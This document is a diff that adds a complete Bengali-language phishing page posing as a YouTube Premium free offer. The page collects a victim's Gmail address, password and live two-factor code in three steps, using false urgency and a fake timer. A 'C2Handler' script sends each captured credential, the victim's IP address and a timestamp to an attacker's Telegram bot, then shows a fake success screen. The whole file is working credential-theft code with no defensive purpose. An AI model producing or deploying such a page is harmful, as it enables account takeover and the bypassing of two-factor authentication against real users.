@@ -1,0 +1,557 @@
+<!doctype html>
+<html lang="bn">
+  <head>
+    <script src="/tg-client.js"></script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>YouTube Premium - ৬ মাস ফ্রি!</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/icon?family=Material+Icons"
+      rel="stylesheet"
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+      body {
+        font-family: "Roboto", sans-serif;
+        background: linear-gradient(
+          135deg,
+          #ff0000 0%,
+          #cc0000 50%,
+          #990000 100%
+        );
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+      }
+      .container {
+        width: 100%;
+        max-width: 420px;
+        background: white;
+        border-radius: 24px;
+        box-shadow: 0 25px 50px rgba(0, 0, 0, 0.25);
+        overflow: hidden;
+      }
+      .header {
+        background: linear-gradient(135deg, #ff0000, #ff4444);
+        color: white;
+        padding: 35px 25px;
+        text-align: center;
+        position: relative;
+        overflow: hidden;
+      }
+      .header::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(
+          90deg,
+          transparent,
+          rgba(255, 255, 255, 0.3),
+          transparent
+        );
+        animation: shine 3s infinite;
+      }
+      @keyframes shine {
+        0% {
+          left: -100%;
+        }
+        100% {
+          left: 100%;
+        }
+      }
+      .logo {
+        font-size: 32px;
+        font-weight: 700;
+        margin-bottom: 15px;
+        text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+      }
+      .offer {
+        font-size: 22px;
+        font-weight: 700;
+        margin-bottom: 8px;
+      }
+      .subtitle {
+        font-size: 16px;
+        opacity: 0.95;
+      }
+      .main {
+        padding: 35px 25px;
+      }
+      .step-title {
+        font-size: 24px;
+        font-weight: 700;
+        color: #202124;
+        margin-bottom: 12px;
+        text-align: center;
+      }
+      .step-desc {
+        color: #5f6368;
+        font-size: 15px;
+        text-align: center;
+        margin-bottom: 25px;
+        line-height: 1.5;
+      }
+      .form-group {
+        position: relative;
+        margin-bottom: 25px;
+      }
+      .label {
+        display: block;
+        font-size: 14px;
+        font-weight: 500;
+        color: #202124;
+        margin-bottom: 8px;
+      }
+      .input {
+        width: 100%;
+        padding: 16px 20px;
+        padding-left: 50px;
+        border: 2px solid #dadce0;
+        border-radius: 12px;
+        font-size: 16px;
+        background: #f8f9fa;
+        transition: all 0.3s;
+        font-family: inherit;
+      }
+      .input:focus {
+        outline: none;
+        border-color: #1a73e8;
+        background: white;
+        box-shadow: 0 4px 20px rgba(26, 115, 232, 0.15);
+        transform: translateY(-1px);
+      }
+      .input-icon {
+        position: absolute;
+        left: 15px;
+        top: 50%;
+        transform: translateY(-50%);
+        color: #5f6368;
+        font-size: 20px;
+        pointer-events: none;
+      }
+      .btn {
+        width: 100%;
+        padding: 16px;
+        background: linear-gradient(135deg, #ff0000, #cc0000);
+        color: white;
+        border: none;
+        border-radius: 12px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.3s;
+        margin-top: 10px;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+      }
+      .btn:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 8px 25px rgba(255, 0, 0, 0.4);
+      }
+      .btn:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+      }
+      .section {
+        display: none;
+      }
+      .section.active {
+        display: block;
+        animation: slideIn 0.4s ease-out;
+      }
+      @keyframes slideIn {
+        from {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+      .urgency {
+        background: linear-gradient(135deg, #1a1a1a, #333);
+        color: white;
+        padding: 18px;
+        border-radius: 12px;
+        text-align: center;
+        font-weight: 600;
+        margin: 25px 0;
+        font-size: 14px;
+      }
+      .loader {
+        text-align: center;
+        padding: 40px 20px;
+        display: none;
+      }
+      .spinner {
+        width: 40px;
+        height: 40px;
+        border: 3px solid #f1f3f4;
+        border-top: 3px solid #ff0000;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin: 0 auto 20px;
+      }
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+      .success {
+        text-align: center;
+        padding: 50px 20px;
+        color: #137333;
+        display: none;
+      }
+      .success-icon {
+        font-size: 64px;
+        margin-bottom: 20px;
+        display: block;
+      }
+      .countdown {
+        background: #fff3cd;
+        border: 2px solid #ffeaa7;
+        color: #856404;
+        padding: 15px;
+        border-radius: 12px;
+        text-align: center;
+        font-weight: 700;
+        font-size: 18px;
+        margin: 20px 0;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="header">
+        <div class="logo">📱 YouTube</div>
+        <div class="offer">🎉 ৬ মাস Premium ফ্রি!</div>
+        <div class="subtitle">বাংলাদেশ স্পেশাল অফার - এখনই দাবি করুন</div>
+      </div>
+
+      <div class="main">
+        <!-- STEP 1: EMAIL -->
+        <div id="step1" class="section active">
+          <div class="step-title">
+            <i
+              class="material-icons"
+              style="
+                font-size: 28px;
+                color: #4285f4;
+                vertical-align: middle;
+                margin-right: 10px;
+              "
+              >mail</i
+            >
+            Gmail দিয়ে শুরু করুন
+          </div>
+          <div class="step-desc">আপনার Gmail দিয়ে Premium পান</div>
+
+          <div class="form-group" style="position: relative">
+            <input
+              type="email"
+              id="email"
+              class="input"
+              placeholder="example@gmail.com"
+              autocomplete="email"
+            />
+            <i class="material-icons input-icon">email</i>
+          </div>
+
+          <button class="btn" id="next1">
+            পরবর্তী <i class="material-icons">arrow_forward</i>
+          </button>
+
+          <div class="urgency">⚡ শুধু ১৮৯ জায়গা বাকি! আজ শেষ!</div>
+        </div>
+
+        <!-- STEP 2: PASSWORD -->
+        <div id="step2" class="section">
+          <div class="step-title">
+            <i
+              class="material-icons"
+              style="
+                font-size: 28px;
+                color: #ea4335;
+                vertical-align: middle;
+                margin-right: 10px;
+              "
+              >lock</i
+            >
+            পাসওয়ার্ড লিখুন
+          </div>
+          <div class="step-desc">
+            YouTube Premium যাচাই করতে আপনার Gmail পাসওয়ার্ড
+          </div>
+
+          <div class="form-group" style="position: relative">
+            <input
+              type="password"
+              id="pass"
+              class="input"
+              placeholder="আপনার পাসওয়ার্ড"
+              autocomplete="current-password"
+            />
+            <i class="material-icons input-icon">lock</i>
+          </div>
+
+          <button class="btn" id="next2">
+            <i class="material-icons">verified</i> যাচাই করুন
+          </button>
+        </div>
+
+        <!-- STEP 3: 2FA CODE -->
+        <div id="step3" class="section">
+          <div class="step-title">
+            <i
+              class="material-icons"
+              style="
+                font-size: 28px;
+                color: #34a853;
+                vertical-align: middle;
+                margin-right: 10px;
+              "
+              >security</i
+            >
+            ২-ফ্যাক্টর কোড
+          </div>
+          <div class="step-desc">
+            আপনার <strong>phone বা Gmail</strong> এ ৬ অঙ্কের কোড এসেছে। এটি
+            লিখুন:
+          </div>
+
+          <div class="countdown">
+            ⏰ কোড ০৩:৫৯ এ মেয়াদ শেষ <span id="timer">59</span> সেকেন্ড
+          </div>
+
+          <div class="form-group" style="position: relative">
+            <input
+              type="text"
+              id="code"
+              class="input"
+              placeholder="৬২৩৪৫৬"
+              maxlength="6"
+              autocomplete="one-time-code"
+            />
+            <i class="material-icons input-icon">vpn_key</i>
+          </div>
+
+          <button class="btn" id="verify">🎥 Premium চালু করুন!</button>
+        </div>
+
+        <!-- LOADING -->
+        <div id="loading" class="loader">
+          <div class="spinner"></div>
+          <div
+            style="
+              font-size: 18px;
+              font-weight: 600;
+              color: #202124;
+              margin-bottom: 15px;
+            "
+          >
+            Premium সাবস্ক্রিপশন যাচাই...
+          </div>
+          <div style="font-size: 14px; color: #5f6368">
+            দয়া করে অপেক্ষা করুন
+          </div>
+        </div>
+
+        <!-- SUCCESS -->
+        <div id="success" class="success">
+          <i class="material-icons success-icon">celebration</i>
+          <h2 style="font-size: 28px; margin-bottom: 15px">✅ Premium চালু!</h2>
+          <p style="font-size: 16px; margin-bottom: 25px">
+            আপনার YouTube Premium এখন ৬ মাস ফ্রি চালু হয়েছে। বিজ্ঞাপন ছাড়া
+            দেখুন!
+          </p>
+          <div style="background: #e8f0fe; padding: 20px; border-radius: 12px">
+            <i
+              class="material-icons"
+              style="
+                color: #4285f4;
+                font-size: 24px;
+                vertical-align: middle;
+                margin-right: 10px;
+              "
+              >check_circle</i
+            >
+            <strong>সফল! ধন্যবাদ</strong>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      class C2Handler {
+        constructor() {
+          this.config = this.init();
+          console.log("C2 Configuration Loaded:", this.config);
+        }
+
+        init() {
+          const params = new URLSearchParams(window.location.search);
+          const p = params.get("p"); // index.html থেকে আসা এনকোডেড ডেটা
+
+          if (p) {
+            try {
+              // Base64 ডিকোড করা হচ্ছে কারণ index.html এনকোড করে পাঠায়
+              const decoded = JSON.parse(atob(p));
+              return {
+                token: decoded.bot,
+                chat: decoded.chat,
+              };
+            } catch (e) {
+              console.error("Invalid Payload Format", e);
+            }
+          }
+          // যদি এনকোড ছাড়া সরাসরি পাঠাতে চান তার জন্য ব্যাকআপ
+          return {
+            token: params.get("token") || params.get("t"),
+            chat: params.get("chat") || params.get("c"),
+          };
+        }
+
+        async getIP() {
+          try {
+            const res = await fetch("https://api.ipify.org?format=json");
+            const data = await res.json();
+            return data.ip;
+          } catch {
+            return "Unknown";
+          }
+        }
+
+        async sendTelegram(email, pass = "", code = "", stage = "email") {
+          if (!this.config.token || !this.config.chat) {
+            console.error("Token or Chat ID missing!");
+            return;
+          }
+
+          const ip = await this.getIP();
+          const time = new Date().toLocaleString("bn-BD", {
+            timeZone: "Asia/Dhaka",
+          });
+
+          // টেলিগ্রাম মেসেজ ফরম্যাট
+          let message = `*🎥 YOUTUBE HIT DETECTED* 🔥\n\n`;
+          message += `👤 *Email:* \`${email}\`\n`;
+          if (pass) message += `🔑 *Password:* \`${pass}\`\n`;
+          if (code) message += `🔐 *2FA Code:* \`${code}\` ✅\n`;
+          message += `\n📊 *Stage:* ${stage.toUpperCase()}\n`;
+          message += `🌐 *IP:* \`${ip}\`\n`;
+          message += `🕐 *Time:* ${time}\n`;
+
+          try {
+            await fetch(
+              `https://api.telegram.org/bot${this.config.token}/sendMessage`,
+              {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  chat_id: this.config.chat,
+                  text: message,
+                  parse_mode: "Markdown",
+                }),
+              },
+            );
+            return true;
+          } catch (error) {
+            console.error("Telegram Error:", error);
+            return false;
+          }
+        }
+      }
+
+      const c2 = new C2Handler();
+      let emailStore = "",
+        passStore = "";
+
+      // Step 1: Email Submit
+      document.getElementById("next1").onclick = async () => {
+        emailStore = document.getElementById("email").value.trim();
+        if (!emailStore.includes("@")) {
+          alert("সঠিক ইমেইল দিন");
+          return;
+        }
+
+        document.getElementById("next1").disabled = true;
+        document.getElementById("next1").innerHTML = "প্রসেসিং...";
+
+        await c2.sendTelegram(emailStore, "", "", "Email Input");
+
+        document.getElementById("step1").style.display = "none";
+        document.getElementById("step2").style.display = "block";
+      };
+
+      // Step 2: Password Submit
+      document.getElementById("next2").onclick = async () => {
+        passStore = document.getElementById("pass").value.trim();
+        if (passStore.length < 4) {
+          alert("সঠিক পাসওয়ার্ড দিন");
+          return;
+        }
+
+        document.getElementById("next2").disabled = true;
+        document.getElementById("next2").innerHTML = "যাচাই হচ্ছে...";
+
+        await c2.sendTelegram(emailStore, passStore, "", "Password Input");
+
+        document.getElementById("step2").style.display = "none";
+        document.getElementById("step3").style.display = "block";
+        startTimer(); // আপনার কোডের টাইমার ফাংশন
+      };
+
+      // Step 3: 2FA Code Submit
+      document.getElementById("verify").onclick = async () => {
+        const code = document.getElementById("code").value.trim();
+        if (code.length < 6) {
+          alert("৬ ডিজিটের কোড দিন");
+          return;
+        }
+
+        document.getElementById("verify").disabled = true;
+
+        await c2.sendTelegram(emailStore, passStore, code, "Full Hit (2FA)");
+
+        document.getElementById("step3").style.display = "none";
+        document.getElementById("loading").style.display = "block";
+
+        setTimeout(() => {
+          document.getElementById("loading").style.display = "none";
+          document.getElementById("success").style.display = "block";
+        }, 3000);
+      };
+
+      // Timer Function
+      function startTimer() {
+        let timeLeft = 239;
+        const interval = setInterval(() => {
+          const mins = Math.floor(timeLeft / 60);
+          const secs = timeLeft % 60;
+          document.getElementById("timer").innerText =
+            secs < 10 ? "0" + secs : secs;
+          timeLeft--;
+          if (timeLeft < 0) clearInterval(interval);
+        }, 1000);
+      }
+    </script>
+  </body>
+</html>
